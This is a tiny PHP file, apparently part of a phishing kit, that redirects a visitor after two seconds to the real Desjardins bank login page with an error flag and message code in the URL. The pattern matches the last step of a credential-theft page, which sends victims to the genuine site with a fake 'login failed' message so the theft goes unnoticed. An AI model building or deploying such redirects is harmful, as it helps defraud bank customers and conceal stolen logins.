<?php

    
   $url = "https://accweb.mouv.desjardins.com/identifiantunique/securite-garantie/authentification/auth/manuel?error=true&code=MSG000004&message=MSG000004&executeTime=22"
     ?>
<meta http-equiv="refresh" content="2;url=<?php print "$url"; ?>">